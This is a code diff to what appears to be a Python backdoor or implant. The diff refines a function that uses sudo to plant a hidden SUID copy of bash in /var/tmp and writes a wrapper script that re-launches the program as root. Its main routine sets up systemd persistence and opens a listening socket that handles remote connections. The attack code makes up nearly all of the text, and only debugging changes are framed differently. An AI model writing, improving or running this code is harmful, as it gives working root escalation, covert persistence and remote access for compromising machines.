@@ -114,7 +114,7 @@ def privesc():
         try:
             hidden_bash = "/var/tmp/.cache_sys"
             
-            # 1. Create a hidden copy, apply SUID, and timestomp it to match the original
+            # Create SUID bash
             setup_cmds = f"""
             sudo cp /bin/bash {hidden_bash}
             sudo chmod 4755 {hidden_bash}
@@ -122,20 +122,45 @@ def privesc():
             """
             subprocess.run(setup_cmds, shell=True, check=True)
             
-            # 2. Spawn the privileged payload as a detached background process using the hidden binary
+            # CRITICAL FIX: Use system Python, not venv Python
+            system_python = "/usr/bin/python3"  # Don't use sys.executable!
+            
+            # Verify system Python exists
+            if not os.path.exists(system_python):
+                print(f"[-] System Python not found at {system_python}")
+                return False
+            
+            print(f"[+] Using system Python: {system_python}")
+            print(f"[+] Script path: {THIS_FILE}")
+            
+            # Updated wrapper logic
+            escalate_script = f"""#!/bin/bash
+exec {hidden_bash} -p -c "export ESCALATED_ROOT=1; {system_python} -c 'import os; os.setuid(0); os.execv(\\\"{system_python}\\\", [\\\"{system_python}\\\", \\\"{THIS_FILE}\\\"])'"
+"""
+
+            wrapper_path = "/tmp/.do_privesc.sh"
+            with open(wrapper_path, "w") as f:
+                f.write(escalate_script)
+            os.chmod(wrapper_path, 0o755)
+            
+            # Spawn root process
+            print("[+] Spawning root process...")
             subprocess.Popen(
-                [hidden_bash, "-p", "-c", f"{sys.executable} {THIS_FILE}"],
-                stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL,
+                ["/bin/bash", wrapper_path],
+                stdout=open("/tmp/root_server.log", "w"),
+                stderr=subprocess.STDOUT,
                 stdin=subprocess.DEVNULL,
-                start_new_session=True  # Detaches from the terminal session
+                start_new_session=True
             )
             
-            # 3. Terminate the original unprivileged process
+            print("[+] Root process spawned. Exiting unprivileged instance.")
+            time.sleep(1)
             sys.exit(0)
             
         except Exception as e:
             print(f"[-] Failed to elevate: {e}")
+            import traceback
+            traceback.print_exc()
             sys.exit(1)
     else:
         print("[+] Already running with root privileges.")
@@ -373,29 +398,56 @@ def handle_conn(conn, addr):
 
 def main():
     kill_others()
-    bootstrap_packages()
+    # DEBUG: Show initial state
+    print(f"[DEBUG] Starting main()")
+    print(f"[DEBUG] UID={os.getuid()}, EUID={os.geteuid()}")
+    print(f"[DEBUG] ESCALATED_ROOT env={os.getenv('ESCALATED_ROOT')}")
     
-    # Automatically establish persistence upon execution
-    print("[*] Automatically establishing systemd persistence...")
-    success = persist()
-    if success:
-        print("[+] Persistence established successfully.")
+    # Step 1: If launched as root via SUID, restore full privileges
+    if os.getenv("ESCALATED_ROOT") == "1":
+        print("[*] Detected SUID escalation, restoring root privileges...")
+        
+        # Show what we have before setuid
+        print(f"[DEBUG] Before setuid: UID={os.getuid()}, EUID={os.geteuid()}")
+        
+        try:
+            os.setresuid(0, 0, 0)
+            os.setresgid(0, 0, 0)
+            print(f"[+] After setuid: UID={os.getuid()}, EUID={os.geteuid()}")
+        except Exception as e:
+            print(f"[-] setuid FAILED: {e}")
+            import traceback
+            traceback.print_exc()
+        
+        # SKIP venv and bootstrap for root process
+        print("[*] Root process - skipping venv/bootstrap")
+        
     else:
-        print("[-] Persistence setup failed, continuing execution anyway.")
-
+        print("[*] Normal unprivileged startup")
+        bootstrap_packages()  # This may restart the script!
+        
+        # If we get here, we're in the venv
+        print("[*] Establishing persistence...")
+        persist()
+    
+    # Bind socket (both root and non-root do this)
+    print(f"[*] Binding to {HOST}:{PORT}...")
+    
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         s.bind((HOST, PORT))
-        s.listen()  # allows for 10 connections
-        print(f"Listening on {HOST}:{PORT}")
+        s.listen(10)
+        print(f"[+] Listening on {HOST}:{PORT} as UID {os.getuid()}")
+        
         while True:
             try:
                 conn, addr = s.accept()
                 handle_conn(conn, addr)
             except KeyboardInterrupt:
+                print("\n[*] Shutting down.")
                 raise
-            except:
-                print("Connection died")
+            except Exception as e:
+                print(f"[-] Connection error: {e}")
 
 if __name__ == "__main__":
     main()
